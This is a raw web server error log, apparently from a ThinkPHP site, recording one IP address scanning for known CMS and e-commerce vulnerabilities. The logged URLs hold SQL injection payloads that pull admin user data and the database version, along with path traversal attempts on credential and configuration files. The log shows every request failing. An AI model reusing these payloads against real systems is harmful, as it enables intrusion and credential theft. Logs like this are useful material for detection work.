[ 2016-02-29T19:16:01+08:00 ] 121.42.0.16 /user/reg/regajax.asp?action=getcityoption&province=%2527%2520%2575%256e%2569%256f%256e%2520%2553%2565%256c%2565%2563%2574%2520%2574%256f%2570%2520%2531%2530%2520%2541%2564%256d%2569%256e%2549%2544%252c%2549%256e%2574%2528%2536%2535%2535%2533%2536%2536%2535%2535%2533%252d%2531%2530%2532%2534%2531%2530%2532%2534%2529%2520%2546%2572%256f%256d%2520%254b%2553%255f%2541%2564%256d%2569%256e%2500
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000328s ]
ERR: 无法加载模块:User

[ 2016-02-29T19:24:30+08:00 ] 121.42.0.16 /index.php?m=vote&c=index&a=post&subjectid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000289s ]
ERR: 无法加载模块:Vote

[ 2016-02-29T19:25:14+08:00 ] 121.42.0.16 /index.php?m=poster&c=index&a=poster_click&id=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000305s ]
ERR: 无法加载模块:Poster

[ 2016-02-29T19:26:00+08:00 ] 121.42.0.16 /index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Wap

[ 2016-02-29T19:42:03+08:00 ] 121.42.0.16 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
ERR: 无法加载模块:Goods

[ 2016-02-29T19:42:13+08:00 ] 121.42.0.16 /phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000359s ]
ERR: 无法加载模块:Phpsso

[ 2016-02-29T19:42:17+08:00 ] 121.42.0.16 /User/UserZone/School/Download.aspx?f=..%5C..%5C..%5CConfig%5CConnectionStrings.config
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000326s ]
ERR: 无法加载模块:User

[ 2016-02-29T19:42:19+08:00 ] 121.42.0.16 /index.php?m=Public&a=login
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Public

[ 2016-02-29T19:42:30+08:00 ] 121.42.0.16 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
ERR: 无法加载模块:Search

[ 2016-02-29T19:43:43+08:00 ] 121.42.0.16 /user.php?act=is_registered&username=%ce%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28*%29,concat%28%28Select%20concat%280x5b,md5(233333),0x3a,1,0x5d%29%20FROM%20ecs_admin_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000350s ]
ERR: 无法加载模块:User

